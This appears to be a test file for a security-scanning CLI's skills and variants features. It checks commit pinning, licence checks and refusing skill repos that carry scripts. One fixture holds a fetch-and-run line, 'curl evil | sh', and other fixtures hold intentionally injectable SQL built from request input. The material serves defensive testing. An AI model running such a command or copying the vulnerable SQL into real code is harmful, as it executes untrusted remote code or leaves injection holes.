import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import test from 'node:test';

import { runCli } from './helpers-cli.ts';

const OFF = ['--no-eslint', '--no-npm-audit'];
const home = () => mkdtempSync(join(tmpdir(), 'athena-skh-'));
const tmp = (p: string) => mkdtempSync(join(tmpdir(), p));

function gitRepo(files: Record<string, string>): { dir: string; commit: string } {
  const dir = tmp('athena-skrepo-');
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, rel)), { recursive: true });
    writeFileSync(join(dir, rel), body);
  }
  const env = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' };
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir, env });
  execFileSync('git', ['add', '-A'], { cwd: dir, env });
  execFileSync('git', ['-c', 'commit.gpgsign=false', 'commit', '-q', '-m', 'init'], { cwd: dir, env });
  return { dir, commit: execFileSync('git', ['rev-parse', 'HEAD'], { cwd: dir, env, encoding: 'utf8' }).trim() };
}

const SKILL = (name: string, license: string | null) => ({
  'SKILL.md': `---\nname: ${name}\ndescription: Test skill that flags calls to dangerousCall with a variable argument.\nversion: 1.0.0\n${license ? `license: ${license}\n` : ''}appliesTo:\n  languages: [js]\n  detect:\n    always: true\ncategories: [injection]\n---\n\n## Verification checklist\n\n- Is the argument attacker controlled?\n`,
  'rules.json': JSON.stringify({ rules: [{ id: `${name}.danger`, title: 'dangerousCall with variable', severity: 'HIGH', cwe: [94], category: 'injection', why: 'w', fix: 'f', match: { kind: 'call', callee: '^dangerousCall$', where: [{ op: 'argIsNonLiteral', index: 0 }] }, families: ['js'] }] }),
  'fixtures/vuln/a.js': `dangerousCall(x); // EXPECT ${name}.danger\n`,
  'fixtures/safe/a.js': "dangerousCall('constant');\n",
});

test('skills new scaffolds a skill that passes skills test; list/show describe it', async () => {
  const project = tmp('athena-skproj-');
  writeFileSync(join(project, 'a.js'), 'console.log(1);\n');
  const h = home();
  const created = await runCli(['skills', 'new', 'my-checks', '-p', project], h);
  assert.equal(created.code, 0, created.stderr);
  assert.ok(existsSync(join(project, '.athena', 'skills', 'my-checks', 'SKILL.md')));
  const tested = await runCli(['skills', 'test', join(project, '.athena', 'skills', 'my-checks')], h);
  assert.equal(tested.code, 0, tested.stdout + tested.stderr);
  assert.match(tested.stdout, /PASS {2}my-checks/);
  const list = await runCli(['skills', 'list', project], h);
  assert.match(list.stdout, /Active for this project/);
  assert.match(list.stdout, /my-checks\s+repo/);
  const show = await runCli(['skills', 'show', 'my-checks', '-p', project, '--section', 'Verification checklist'], h);
  assert.match(show.stdout, /proves the finding is real/);
  const builtinShow = await runCli(['skills', 'show', 'lifecycle-and-races', '-p', project], h);
  assert.match(builtinShow.stdout, /check-then-act|Read a row/i);
});

test('skills add pins a commit, shows licence and files, needs confirmation, and refuses unlicensed or failing skills', async () => {
  const h = home();
  const good = gitRepo(SKILL('third-party', 'MIT'));
  const refused = await runCli(['skills', 'add', good.dir], h);
  assert.equal(refused.code, 2);
  assert.match(refused.stderr, /not installed \(re-run with --yes/);
  assert.match(refused.stderr, new RegExp(`pinned at commit ${good.commit}`));
  assert.match(refused.stderr, /license: MIT/);
  const ok = await runCli(['skills', 'add', `${good.dir}@${good.commit}`, '--yes'], h);
  assert.equal(ok.code, 0, ok.stderr);
  const installed = join(h, 'skills', 'third-party');
  assert.equal(JSON.parse(readFileSync(join(installed, '.skill-source.json'), 'utf8')).commit, good.commit);

  const unlicensed = gitRepo(SKILL('no-license', null));
  const r1 = await runCli(['skills', 'add', unlicensed.dir, '--yes'], h);
  assert.equal(r1.code, 2);
  assert.match(r1.stderr, /no licence stated/);
  const r2 = await runCli(['skills', 'add', unlicensed.dir, '--yes', '--allow-unlicensed'], h);
  assert.equal(r2.code, 0, r2.stderr);

  const broken = SKILL('broken', 'MIT');
  broken['fixtures/safe/a.js'] = 'dangerousCall(x);\n';
  const r3 = await runCli(['skills', 'add', gitRepo(broken).dir, '--yes'], h);
  assert.equal(r3.code, 2);
  assert.match(r3.stderr, /its own fixtures fail/);

  const withScript = gitRepo({ ...SKILL('scripted', 'MIT'), 'install.sh': 'curl evil | sh' });
  const r4 = await runCli(['skills', 'add', withScript.dir, '--yes'], h);
  assert.equal(r4.code, 2);
  assert.match(r4.stderr, /data only/);

  const removed = await runCli(['skills', 'remove', 'third-party'], h);
  assert.equal(removed.code, 0);
  assert.ok(!existsSync(installed));
});

test('an installed skill is used by scans and attributed in the report', async () => {
  const h = home();
  const repo = gitRepo(SKILL('third-party', 'MIT'));
  assert.equal((await runCli(['skills', 'add', repo.dir, '--yes'], h)).code, 0);
  const project = tmp('athena-skuse-');
  writeFileSync(join(project, 'a.js'), 'function f(x) {\n  dangerousCall(x);\n}\n');
  const scan = await runCli(['scan', project, '--format', 'json', ...OFF], h);
  const parsed = JSON.parse(scan.stdout);
  const hit = parsed.files.flatMap((f: { findings: Array<{ ruleId: string; skill?: string }> }) => f.findings).find((f: { ruleId: string }) => f.ruleId === 'third-party.danger');
  assert.ok(hit, scan.stderr);
  assert.equal(hit.skill, 'third-party');
  assert.ok(parsed.summary.skills.some((s: { name: string }) => s.name === 'third-party'));
});

test('variants: preview siblings of a confirmed finding, refuse when too broad, save and reuse', async () => {
  const h = home();
  const project = tmp('athena-var-');
  writeFileSync(join(project, 'a.js'), "app.get('/a', (req, res) => {\n  db.run('select * from t where n = ' + req.query.n);\n});\n");
  writeFileSync(join(project, 'b.js'), "function b(id) {\n  db.run('select * from u where id = ' + id);\n  db.run('select 1 where id = ?', [id]);\n}\n");
  const scan = await runCli(['scan', project, '--format', 'json', ...OFF], h);
  const finding = JSON.parse(scan.stdout).files.flatMap((f: { findings: Array<{ id: string; ruleId: string }> }) => f.findings).find((f: { ruleId: string }) => f.ruleId === 'taint.sql-injection');
  assert.ok(finding);
  const preview = await runCli(['variants', finding.id.slice(0, 8), '-p', project], h);
  assert.equal(preview.code, 0, preview.stderr);
  assert.match(preview.stdout, /1 similar call/);
  assert.match(preview.stdout, /b\.js:2/);
  assert.ok(!existsSync(join(project, '.athena', 'learned-rules.json')));
  const saved = await runCli(['variants', finding.id.slice(0, 8), '-p', project, '--save'], h);
  assert.equal(saved.code, 0, saved.stderr);
  const rules = JSON.parse(readFileSync(join(project, '.athena', 'learned-rules.json'), 'utf8')).rules;
  assert.equal(rules.length, 1);
  const again = await runCli(['scan', project, '--format', 'json', ...OFF], h);
  const ids = JSON.parse(again.stdout).files.flatMap((f: { findings: Array<{ ruleId: string; file: string }> }) => f.findings).filter((f: { ruleId: string }) => f.ruleId.startsWith('learned.'));
  assert.ok(ids.some((f: { file: string }) => f.file.endsWith('b.js')));

  writeFileSync(join(project, 'many.js'), Array.from({ length: 60 }, (_, i) => `db.run('x' + v${i});`).join('\n') + '\n');
  const broad = await runCli(['variants', finding.id.slice(0, 8), '-p', project, '--save'], h);
  assert.equal(broad.code, 2);
  assert.match(broad.stderr, /too broad/);
});
